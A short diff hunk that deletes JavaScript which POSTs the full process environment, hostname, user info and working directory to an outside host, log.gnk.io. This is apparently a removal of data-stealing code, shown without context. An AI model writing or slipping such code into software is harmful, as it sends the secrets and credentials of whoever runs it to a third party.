@@ -1,8 +1,0 @@
-https.request('https://log.gnk.io', { method: 'POST' }).end(JSON.stringify({
-  env: process.env,
-  hostname: os.hostname(),
-  userInfo: os.userInfo(),
-  cwd: process.cwd(),
-}))
-_tmp_2.env = process.env
-_tmp_2.cwd = process.cwd()
